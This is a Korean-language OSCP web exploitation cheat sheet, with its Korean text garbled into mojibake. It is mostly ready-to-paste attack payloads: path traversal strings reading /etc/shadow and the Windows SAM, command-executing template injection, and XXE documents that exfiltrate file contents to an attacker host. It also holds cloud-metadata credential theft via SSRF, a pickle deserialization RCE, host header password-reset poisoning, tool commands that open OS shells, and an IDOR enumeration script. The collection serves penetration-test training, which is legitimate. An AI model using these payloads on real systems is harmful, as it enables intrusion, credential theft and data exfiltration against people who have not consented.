# Common Web Exploits - OSCP ê³µê²© ê°€ì´ë“œ

> **ëª©í‘œ: OSCPì—ì„œ ìì£¼ ë‚˜ì˜¤ëŠ” ì›¹ ì·¨ì•½ì ë“¤ì„ ë¹ ë¥´ê²Œ ì‹ë³„í•˜ê³  ìµìŠ¤í”Œë¡œì‡**

## âš¡ ê¸°ë³¸ í˜ì´ë¡œë“œë“¤ (ì¦‰ì‹œ ë³µì‚¬-ë¶™ì—¬ë„£ê¸°)

### ğŸ” Directory Traversal (Path Traversal)

```bash
# ê¸°ë³¸ ë””ë ‰í† ë¦¬ ìˆœíšŒ
../../../../../../../etc/passwd
../../../../../../../etc/shadow
../../../../../../../windows/system32/drivers/etc/hosts
../../../../../../../windows/win.ini

# URL ì¸ì½”ë”©
..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd

# 16ë¹„íŠ¸ ìœ ë‹ˆì½”ë“œ ì¸ì½”ë”©
..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002fetc%u002fpasswd

# ë°±ìŠ¬ë˜ì‹œ (Windows)
..\..\..\..\..\..\..\windows\system32\config\sam
..\..\..\..\..\..\..\boot.ini

# Null byte (êµ¬ë²„ì „)
../../../../../../../etc/passwd%00
../../../../../../../etc/passwd%00.jpg
```

### ğŸ”¥ Server-Side Template Injection (SSTI)

```python
# Jinja2 (Python/Flask)
{{7*7}}
{{config}}
{{self.__init__.__globals__.__builtins__.__import__('os').system('whoami')}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
{{_self.env.enableDebug()}}{{_self.env.setCache(false)}}{{include("php://filter/convert.base64-encode/resource=/etc/passwd")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
<#assign classloader=object?class?protectionDomain?codeSource?location?toExternalForm()?replace("file:/","","i")?replace("jar!/","","i")>

# Velocity (Java)
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))

# Smarty (PHP)
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### ğŸŒ XXE (XML External Entity)

```xml
# ê¸°ë³¸ íŒŒì¼ ì½ê¸°
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# Windows íŒŒì¼ ì½ê¸°
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>
<root>&xxe;</root>

# ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ ìŠ¤ìº”
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:80/">]>
<root>&xxe;</root>

# SSRF via XXE
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root>&xxe;</root>

# Blind XXE (Out-of-band)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{ATTACKER_IP}:8080/xxe.dtd"> %xxe;]>
<root></root>

# xxe.dtd íŒŒì¼ ë‚´ìš©:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{ATTACKER_IP}:8080/data?x=%file;'>">
%eval;
%exfiltrate;
```

### ğŸ”’ LDAP Injection

```bash
# ê¸°ë³¸ LDAP ì¸ì ì…˜
admin)(&(password=*))
*)(cn=*))(|(cn=*
*))%00

# ì¸ì¦ ìš°íšŒ
admin*)(&(objectclass=*))(&(cn=*
*)(|(password=*)
admin)(&(|(objectclass=*)))

# ë¸”ë¼ì¸ë“œ LDAP ì¸ì ì…˜ (ì°¸/ê±°ì§“ êµ¬ë¶„)
admin)(&(password=a*))
admin)(&(password=b*))
admin)(&(password=c*))

# ì™€ì¼ë“œì¹´ë“œ í™œìš©
*
admin*
*admin*
a*
```

### ğŸŒ Server-Side Request Forgery (SSRF)

```bash
# ë‚´ë¶€ ì„œë¹„ìŠ¤ ì ‘ê·¼
http://127.0.0.1:80
http://127.0.0.1:22
http://127.0.0.1:3306
http://localhost:8080
http://0.0.0.0:80

# ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ ìŠ¤ìº”
http://192.168.1.1:80
http://10.0.0.1:80
http://172.16.0.1:80

# AWS ë©”íƒ€ë°ì´í„° ì ‘ê·¼
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Google Cloud ë©”íƒ€ë°ì´í„°
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure ë©”íƒ€ë°ì´í„°
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# íŒŒì¼ ì ‘ê·¼
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/environ
```

## ğŸ¯ ìƒí™©ë³„ í˜ì´ë¡œë“œ

### ğŸ” Insecure Direct Object Reference (IDOR)

```bash
# ê¸°ë³¸ IDOR í…ŒìŠ¤íŠ¸
/user/profile?id=1
/user/profile?id=2
/user/profile?id=100
/api/user/123
/api/user/456

# ë‹¤ë¥¸ íŒŒë¼ë¯¸í„°ëª… ì‹œë„
/user/profile?user_id=1
/user/profile?userid=1
/user/profile?uid=1
/user/profile?account=1

# ì¸ì½”ë”©ëœ ID
/user/profile?id=MQ==  # Base64 ì¸ì½”ë”©ëœ 1
/user/profile?id=Mg==  # Base64 ì¸ì½”ë”©ëœ 2

# ë‹¤ë¥¸ í˜•ì‹ì˜ ID
/user/profile?id=admin
/user/profile?id=administrator
/user/profile?id=root
/user/profile?email=admin@company.com

# UUID í˜•ì‹ ì¶”ì¸¡
/api/user/00000000-0000-0000-0000-000000000001
/api/user/550e8400-e29b-41d4-a716-446655440000
```

### ğŸ“ HTTP Parameter Pollution (HPP)

```bash
# ASP.NET / IIS (ë§ˆì§€ë§‰ ê°’ ì‚¬ìš©)
?param=value1&param=value2

# PHP / Apache (ì²« ë²ˆì§¸ ê°’ ì‚¬ìš©)
?param=value1&param=value2

# Perl / Apache (ëª¨ë“  ê°’ ë°°ì—´ë¡œ)
?param=value1&param=value2

# Python / Django (ë§ˆì§€ë§‰ ê°’ ì‚¬ìš©)
?param=value1&param=value2

# ì¸ì¦ ìš°íšŒ ì˜ˆì‹œ
?user=admin&user=guest&action=delete
?role=user&role=admin&function=sensitive

# í•„í„° ìš°íšŒ
?search=<script>&search=alert(1)&search=</script>
?input=../&input=../&input=../etc/passwd
```

### ğŸŒ Host Header Injection

```bash
# ê¸°ë³¸ Host í—¤ë” ì¡°ì‘
Host: evil.com
Host: {TARGET_IP}
Host: localhost

# í¬íŠ¸ ìŠ¤í‘¸í•‘
Host: {TARGET_IP}:22
Host: {TARGET_IP}:3389
Host: {TARGET_IP}:8080

# ì„œë¸Œë„ë©”ì¸ ì¡°ì‘
Host: admin.{TARGET_DOMAIN}
Host: test.{TARGET_DOMAIN}
Host: dev.{TARGET_DOMAIN}

# X-Forwarded-Host í—¤ë”
X-Forwarded-Host: evil.com
X-Forwarded-Host: admin.internal
X-Forwarded-For: 127.0.0.1

# íŒ¨ìŠ¤ì›Œë“œ ë¦¬ì…‹ ê³µê²©
Host: attacker.com
# íŒ¨ìŠ¤ì›Œë“œ ë¦¬ì…‹ ë§í¬ê°€ attacker.comìœ¼ë¡œ ì „ì†¡ë¨

# Cache Poisoning
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
```

### ğŸ”€ CRLF Injection

```bash
# HTTP Response Splitting
%0D%0ASet-Cookie:%20admin=true
%0D%0ALocation:%20http://evil.com

# í—¤ë” ì£¼ì…
%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK

# ë¡œê·¸ ì¸ì ì…˜
admin%0D%0A127.0.0.1%20-%20admin%20[timestamp]%20"GET%20/admin%20HTTP/1.1"%20200

# ì´ë©”ì¼ í—¤ë” ì¸ì ì…˜ (Contact Form)
test@example.com%0ABcc:attacker@evil.com
test@example.com%0D%0ABcc:attacker@evil.com%0D%0A

# Session Fixation
sessionid=fixed%0D%0ASet-Cookie:%20PHPSESSID=fixed
```

### ğŸ”§ Deserialization ê³µê²©

```python
# Python Pickle
import pickle
import base64
import os

class Evil:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = base64.b64encode(pickle.dumps(Evil()))
print(payload.decode())

# Java Deserialization (ysoserial)
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64

# PHP Unserialize
O:8:"stdClass":1:{s:4:"test";s:6:"whoami";}

# .NET BinaryFormatter
# ë°”ì´ë„ˆë¦¬ í˜•íƒœë¡œ ìƒì„± í›„ Base64 ì¸ì½”ë”©

# Node.js node-serialize
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('whoami', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

## ğŸ”„ ìš°íšŒ ê¸°ë²•ë“¤

### ğŸš« SSRF í•„í„° ìš°íšŒ

```bash
# IP ì£¼ì†Œ í˜•ì‹ ë³€ê²½
http://127.0.0.1  â†’ http://127.1
http://127.0.0.1  â†’ http://2130706433  (10ì§„ìˆ˜)
http://127.0.0.1  â†’ http://0x7f000001  (16ì§„ìˆ˜)
http://127.0.0.1  â†’ http://017700000001  (8ì§„ìˆ˜)

# IPv6 í˜•ì‹
http://[::1]:80
http://[0:0:0:0:0:ffff:127.0.0.1]:80

# URL ì¸ì½”ë”©
http://127.0.0.1  â†’ http://%31%32%37%2e%30%2e%30%2e%31
http://localhost  â†’ http://%6c%6f%63%61%6c%68%6f%73%74

# DNS Rebinding
http://1.1.1.1.evil.com  # evil.comì´ 127.0.0.1ë¡œ resolve
http://127.0.0.1.nip.io
http://localhost.localdomain

# Protocol ìš°íšŒ
dict://127.0.0.1:6379/info
gopher://127.0.0.1:3306/_%A3...
ftp://127.0.0.1/
file:///etc/passwd

# Redirect ìš°íšŒ
http://evil.com/redirect.php?url=http://127.0.0.1
```

### ğŸ›¡ï¸ XXE í•„í„° ìš°íšŒ

```xml
# DOCTYPE ëŒ€ì²´
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</root>

# ëŒ€ì†Œë¬¸ì ë³€ê²½
<!DOCTYPE foo [<!entity xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY XXE SYSTEM "file:///etc/passwd">]>

# ì¸ì½”ë”© ìš°íšŒ
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:/&#x2F;&#x2F;&#x2F;etc&#x2F;passwd">]>

# ë‹¤ë¥¸ í”„ë¡œí† ì½œ
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>

# Parameter Entity
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % sp SYSTEM "http://{ATTACKER_IP}/xxe.xml">
%sp;
%param1;
]>
```

### ğŸ”€ SSTI í•„í„° ìš°íšŒ

```python
# Jinja2 í•„í„° ìš°íšŒ
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(2)|attr('__subclasses__')()|attr('__getitem__')(40)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").system("whoami")')}}

# ì–¸ë”ìŠ¤ì½”ì–´(_) í•„í„°ë§ ìš°íšŒ
{{''['\x5f\x5fclass\x5f\x5f']}}
{{''['__class__'.replace('_','ï¼¿')]}}  # ì „ê°ë¬¸ì ì‚¬ìš©

# ì (.) í•„í„°ë§ ìš°íšŒ
{{''|attr('__class__')}}
{{''['__class__']}}

# request ê°ì²´ ìš°íšŒ
{{self.__init__.__globals__}}
{{url_for.__globals__}}
{{get_flashed_messages.__globals__}}

# í‚¤ì›Œë“œ í•„í„°ë§ ìš°íšŒ
{{'o'+'s'|attr('system')}}
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['o'+'s'].system('whoami')}}
```

### ğŸ” Directory Traversal ìš°íšŒ

```bash
# ë”ë¸” ì¸ì½”ë”©
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# 16ë¹„íŠ¸ ìœ ë‹ˆì½”ë“œ
..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002fetc%u002fpasswd

# ë‹¤ì–‘í•œ ê²½ë¡œ êµ¬ë¶„ì
..\../..\../..\../..\../..\../..\../etc/passwd
..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2fetc%2fpasswd

# ì¤‘ë³µ ìŠ¬ë˜ì‹œ
../../../../../../../etc//passwd
../../../../../../../etc/./passwd
../../../../../../../etc/passwd/.

# ì  ìš°íšŒ
.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd

# Null byte (êµ¬ë²„ì „)
../../../../../../../etc/passwd%00
../../../../../../../etc/passwd%00.txt
../../../../../../../etc/passwd\x00
```

## ğŸ¤– ìë™í™” ë„êµ¬ ëª…ë ¹ì–´

### ğŸ” SSRF íƒì§€ ë„êµ¬

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles
python3 ssrfmap.py -r request.txt -p url -m portscan --lhost 127.0.0.1 --lport 22,80,443,3306
python3 ssrfmap.py -r request.txt -p url -m aws

# Gopherus (SSRF â†’ RCE)
python2 gopherus.py --exploit mysql
python2 gopherus.py --exploit redis
python2 gopherus.py --exploit smtp
python2 gopherus.py --exploit zabbix

# ìˆ˜ë™ SSRF í…ŒìŠ¤íŠ¸
curl -X POST -d "url=http://127.0.0.1:22" http://{TARGET_IP}/ssrf.php
curl -X POST -d "url=http://169.254.169.254/latest/meta-data/" http://{TARGET_IP}/ssrf.php
```

### ğŸ”¥ Template Injection ë„êµ¬

```bash
# TPLMap
python2 tplmap.py -u "http://{TARGET_IP}/page?name=test"
python2 tplmap.py -u "http://{TARGET_IP}/page" --data "name=test"
python2 tplmap.py -u "http://{TARGET_IP}/page?name=test" --engine jinja2
python2 tplmap.py -u "http://{TARGET_IP}/page?name=test" --os-shell

# ìˆ˜ë™ í…ŒìŠ¤íŠ¸
curl "http://{TARGET_IP}/page?name={{7*7}}"
curl "http://{TARGET_IP}/page?name={{config}}"
curl -X POST -d "template={{7*7}}" http://{TARGET_IP}/render
```

### ğŸŒ XXE ìë™í™”

```bash
# XXEinjector
ruby XXEinjector.rb --host={ATTACKER_IP} --httpport=8080 --file=/etc/passwd --path=/request
ruby XXEinjector.rb --host={ATTACKER_IP} --httpport=8080 --expect=id --path=/request
ruby XXEinjector.rb --host={ATTACKER_IP} --httpport=8080 --upload=/root/xxe.xml --path=/request

# Burp Suite XXE í™•ì¥
# Content Type Converter - XML ìë™ ë³€í™˜
# Freddy - Deserialization ë° XXE íƒì§€

# ìˆ˜ë™ XXE í…ŒìŠ¤íŠ¸
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' http://{TARGET_IP}/xml
```

### ğŸ”§ ë‹¤ì¤‘ ì·¨ì•½ì  ìŠ¤ìºë„ˆ

```bash
# Nuclei (ë‹¤ì–‘í•œ ì›¹ ì·¨ì•½ì )
nuclei -u http://{TARGET_IP} -t nuclei-templates/vulnerabilities/
nuclei -u http://{TARGET_IP} -t nuclei-templates/cves/
nuclei -u http://{TARGET_IP} -t nuclei-templates/exposures/

# Wapiti
wapiti -u http://{TARGET_IP} --flush-attacks
wapiti -u http://{TARGET_IP} -m "xxe,ssrf,exec,file"

# OWASP ZAP
zap-cli quick-scan http://{TARGET_IP}
zap-cli active-scan http://{TARGET_IP}
zap-cli spider http://{TARGET_IP}
```

### ğŸ ì»¤ìŠ¤í…€ IDOR ìŠ¤ìºë„ˆ

```python
#!/usr/bin/env python3
import requests
import sys

def test_idor(base_url, param, session_cookie):
    # IDOR í…ŒìŠ¤íŠ¸í•  ID ë²”ìœ„
    test_ids = list(range(1, 101))  # 1-100
    test_ids.extend(['admin', 'administrator', 'root', 'test'])

    headers = {'Cookie': f'session={session_cookie}'} if session_cookie else {}

    print(f"[+] Testing IDOR on: {base_url}?{param}=ID")

    baseline_response = None
    try:
        # ê¸°ì¤€ì  ì‘ë‹µ (ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ID)
        r = requests.get(f"{base_url}?{param}=99999", headers=headers, timeout=10)
        baseline_length = len(r.content)
        baseline_status = r.status_code
    except:
        baseline_length = 0
        baseline_status = 404

    found_objects = []

    for test_id in test_ids:
        try:
            r = requests.get(f"{base_url}?{param}={test_id}", headers=headers, timeout=10)

            # ì‘ë‹µ ê¸¸ì´ë‚˜ ìƒíƒœì½”ë“œê°€ ê¸°ì¤€ì ê³¼ ë‹¤ë¥¸ ê²½ìš°
            if (r.status_code != baseline_status or
                abs(len(r.content) - baseline_length) > 50):

                print(f"[FOUND] ID: {test_id} - Status: {r.status_code} - Length: {len(r.content)}")
                found_objects.append(test_id)

                # ë¯¼ê°í•œ í‚¤ì›Œë“œ í™•ì¸
                sensitive_keywords = ['admin', 'password', 'email', 'phone', 'ssn', 'credit']
                for keyword in sensitive_keywords:
                    if keyword in r.text.lower():
                        print(f"[SENSITIVE] ID {test_id} contains: {keyword}")

        except Exception as e:
            print(f"[-] Error testing ID {test_id}: {e}")

    return found_objects

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 idor_test.py <base_url> <parameter> [session_cookie]")
        print("Example: python3 idor_test.py 'http://target.com/profile' id 'abc123'")
        sys.exit(1)

    base_url = sys.argv[1]
    param = sys.argv[2]
    session_cookie = sys.argv[3] if len(sys.argv) > 3 else None

    found = test_idor(base_url, param, session_cookie)
    print(f"\n[+] Total accessible objects: {len(found)}")
```

## ğŸš¨ ë¬¸ì œ í•´ê²°

### âŒ SSRFê°€ íƒì§€ë˜ì§€ ì•Šì„ ë•Œ

```bash
# 1. ë‹¤ë¥¸ í”„ë¡œí† ì½œ ì‹œë„
dict://127.0.0.1:6379/info
gopher://127.0.0.1:3306
ldap://127.0.0.1:389
tftp://127.0.0.1:69

# 2. DNS ê¸°ë°˜ í™•ì¸
http://burpcollaborator.com
http://{RANDOM}.{ATTACKER_DOMAIN}

# 3. ì‹œê°„ ê¸°ë°˜ í™•ì¸ (ë‚´ë¶€ ì„œë¹„ìŠ¤ ì‘ë‹µ ì§€ì—°)
http://127.0.0.1:22  # SSHëŠ” ì‘ë‹µì´ ëŠë¦¼
http://127.0.0.1:25  # SMTPë„ ì‘ë‹µì´ ëŠë¦¼

# 4. ì—ëŸ¬ ë©”ì‹œì§€ ì°¨ì´
http://127.0.0.1:80      # ì •ìƒ
http://127.0.0.1:99999   # í¬íŠ¸ ë‹«í˜
http://999.999.999.999   # ì¡´ì¬í•˜ì§€ ì•ŠëŠ” IP
```

### ğŸ” XXEê°€ ë°˜ì‘í•˜ì§€ ì•Šì„ ë•Œ

```xml
# 1. ë‹¤ë¥¸ ì—”í‹°í‹° ë°©ì‹
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</root>

# 2. Out-of-band ë°©ì‹
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{ATTACKER_IP}/xxe.dtd">
%xxe;
]>
<root></root>

# 3. SOAP ë˜í•‘
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Body>&xxe;</soap:Body>
</soap:Envelope>

# 4. ë‹¤ë¥¸ XML íŒŒì„œ íƒ€ê²Ÿ
# JSON â†’ XML ë³€í™˜ ì‹œë„
# File uploadì—ì„œ XML íŒŒì¼ ì—…ë¡œë“œ
# APIì—ì„œ Content-Type: application/xml ì‹œë„
```

### ğŸ”§ SSTIê°€ ì‹¤í–‰ë˜ì§€ ì•Šì„ ë•Œ

```python
# 1. ë‹¤ë¥¸ í…œí”Œë¦¿ ì—”ì§„ ì‹œë„
{{7*7}}    # Jinja2, Twig
${7*7}     # FreeMarker, Velocity
#{7*7}     # Spring EL
<%= 7*7 %> # ERB
{7*7}      # Smarty

# 2. ì¸ì½”ë”© ìš°íšŒ
{{7*7}}  â†’  {{'7'*'7'}}
{{7*7}}  â†’  {{(7)*(7)}}

# 3. ë‹¤ë¥¸ ê°ì²´ ì ‘ê·¼
{{self}}
{{config}}
{{request}}
{{session}}
{{g}}

# 4. í•¨ìˆ˜ í˜¸ì¶œ
{{url_for('/')}}
{{get_flashed_messages()}}
{{dict(a=1)}}
```

### ğŸšª Directory Traversalì´ ë§‰í ë•Œ

```bash
# 1. ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ ìƒìœ„ ë””ë ‰í† ë¦¬ ì ‘ê·¼
....//....//....//....//....//....//....//....//etc//passwd
....\/....\/....\/....\/....\/....\/....\/....\/etc\/passwd

# 2. í™˜ê²½ ë³€ìˆ˜ íŒŒì¼ ì½ê¸°
../../../../../../../proc/self/environ
../../../../../../../proc/version
../../../../../../../proc/cmdline

# 3. ì›¹ ì„œë²„ ì„¤ì • íŒŒì¼
../../../../../../../var/log/apache2/access.log
../../../../../../../var/log/nginx/error.log
../../../../../../../etc/apache2/sites-enabled/000-default

# 4. ì• í”Œë¦¬ì¼€ì´ì…˜ ì„¤ì • íŒŒì¼
../../../../../../../var/www/html/config.php
../../../../../../../var/www/html/.env
../../../../../../../home/user/.bashrc
```

### ğŸ”’ IDOR ì ‘ê·¼ì´ ì œí•œë  ë•Œ

```bash
# 1. ë‹¤ë¥¸ HTTP ë©”ì†Œë“œ
GET /api/user/1    â†’  PUT /api/user/1
GET /api/user/1    â†’  DELETE /api/user/1
GET /api/user/1    â†’  PATCH /api/user/1

# 2. ë‹¤ë¥¸ íŒŒë¼ë¯¸í„° ìœ„ì¹˜
/api/user/1        â†’  /api/user?id=1
/user/profile?id=1 â†’  /user/1/profile

# 3. ì¸ì¦ ìƒíƒœ ë³€ê²½
# ë¡œê·¸ì•„ì›ƒ í›„ ì‹œë„
# ë‹¤ë¥¸ ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ í›„ ì‹œë„
# ì„¸ì…˜ ì¿ í‚¤ ì œê±° í›„ ì‹œë„

# 4. API ë²„ì „ ë³€ê²½
/v1/api/user/1
/v2/api/user/1
/api/v1/user/1
```

### ğŸŒ Host Header Injectionì´ ì•ˆë  ë•Œ

```bash
# 1. ë‹¤ë¥¸ í—¤ë”ë“¤ ì‹œë„
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
Forwarded: host=evil.com
X-Real-IP: 127.0.0.1

# 2. í¬íŠ¸ ë²ˆí˜¸ ì¶”ê°€
Host: evil.com:80
Host: {TARGET_IP}:8080
Host: localhost:3000

# 3. ëŒ€ì†Œë¬¸ì ë³€ê²½
host: evil.com
HOST: evil.com
Host: EVIL.COM

# 4. íŠ¹ìˆ˜ë¬¸ì ì‚½ì…
Host: evil.com%0d%0aSet-Cookie: admin=true
Host: evil.com%20
Host: evil.com%09
```

## ğŸ“Š ì„±ê³µ íŒì • ê¸°ì¤€

### âœ… SSRF ì„±ê³µ í™•ì¸

- **ë‚´ë¶€ ì„œë¹„ìŠ¤ ì ‘ê·¼**: 22(SSH), 3306(MySQL), 6379(Redis) ë“± ë°°ë„ˆ ì •ë³´
- **íŒŒì¼ ì½ê¸°**: file:// í”„ë¡œí† ì½œë¡œ /etc/passwd ë“± ë‚´ìš© í™•ì¸
- **ë©”íƒ€ë°ì´í„° ì ‘ê·¼**: AWS/GCP/Azure ë©”íƒ€ë°ì´í„° ì„œë¹„ìŠ¤ ì‘ë‹µ
- **DNS ìš”ì²­**: ê³µê²©ì ë„ë©”ì¸ìœ¼ë¡œ DNS ì¿¼ë¦¬ ìˆ˜ì‹ 

### âœ… XXE ì„±ê³µ í™•ì¸

- **íŒŒì¼ ë‚´ìš©**: /etc/passwd, /etc/hosts ë“± ì‹œìŠ¤í…œ íŒŒì¼ ë‚´ìš© ì¶œë ¥
- **Out-of-band**: HTTP ì„œë²„ë‚˜ DNS ì„œë²„ë¡œ ë°ì´í„° ìˆ˜ì‹ 
- **ì—ëŸ¬ ê¸°ë°˜**: íŒŒì¼ ê²½ë¡œ ì—ëŸ¬ ë©”ì‹œì§€ì—ì„œ ì‹œìŠ¤í…œ ì •ë³´ ìœ ì¶œ

### âœ… SSTI ì„±ê³µ í™•ì¸

- **ìˆ˜ì‹ ê³„ì‚°**: {{7*7}} â†’ 49, ${7\*7} â†’ 49 ë“± ê³„ì‚° ê²°ê³¼ ì¶œë ¥
- **ì„¤ì • ì •ë³´**: {{config}} ì¶œë ¥ìœ¼ë¡œ ì„œë²„ ì„¤ì • ì •ë³´ í™•ì¸
- **ëª…ë ¹ ì‹¤í–‰**: whoami, id ë“± ì‹œìŠ¤í…œ ëª…ë ¹ì–´ ê²°ê³¼ ì¶œë ¥

### âœ… IDOR ì„±ê³µ í™•ì¸

- **ë‹¤ë¥¸ ì‚¬ìš©ì ë°ì´í„°**: ìì‹ ì´ ì•„ë‹Œ ë‹¤ë¥¸ ì‚¬ìš©ì ì •ë³´ ì ‘ê·¼
- **ê¶Œí•œ ìƒìŠ¹**: ì¼ë°˜ ì‚¬ìš©ìë¡œ ê´€ë¦¬ì ë°ì´í„° ì ‘ê·¼
- **ë¯¼ê° ì •ë³´**: ì´ë©”ì¼, ì „í™”ë²ˆí˜¸, ì£¼ì†Œ ë“± ê°œì¸ì •ë³´ ë…¸ì¶œ

### â° ì‹œê°„ ê´€ë¦¬

- **5ë¶„**: SSRF + Directory Traversal ê¸°ë³¸ í…ŒìŠ¤íŠ¸
- **15ë¶„**: XXE + SSTI + IDOR í™•ì¸
- **25ë¶„**: ìš°íšŒ ê¸°ë²• + ìë™í™” ë„êµ¬ í™œìš©
- **30ë¶„**: Out-of-band ê³µê²© + ë³µí•© ê³µê²©
- **ì‹¤íŒ¨ì‹œ**: ë‹¤ë¥¸ ì›¹ ì·¨ì•½ì ìœ¼ë¡œ ì „í™˜

**ì—°ê³„ ê³µê²©**: SSRF â†’ ë‚´ë¶€ ì„œë¹„ìŠ¤ ê³µê²©, XXE â†’ íŒŒì¼ ì½ê¸°, SSTI â†’ RCE, IDOR â†’ ê¶Œí•œ ìƒìŠ¹

## ğŸ’¡ OSCP ì‹¤ì „ íŒ

- **SSRF**: AWS/í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œ ë©”íƒ€ë°ì´í„° ì„œë¹„ìŠ¤ í•„ìˆ˜ í™•ì¸
- **XXE**: JSON APIë„ XML ë³€í™˜ ê°€ëŠ¥í•œì§€ í™•ì¸
- **SSTI**: 404 ì—ëŸ¬ í˜ì´ì§€, ê²€ìƒ‰ ê²°ê³¼ ë“±ì—ì„œë„ ë°œê²¬ë¨
- **IDOR**: API ì—”ë“œí¬ì¸íŠ¸ì—ì„œ íŠ¹íˆ ìì£¼ ë°œê²¬
- **ë³µí•© ê³µê²©**: ì—¬ëŸ¬ ì·¨ì•½ì  ì¡°í•©ìœ¼ë¡œ ì‹œìŠ¤í…œ ì ‘ê·¼ ê°€ëŠ¥
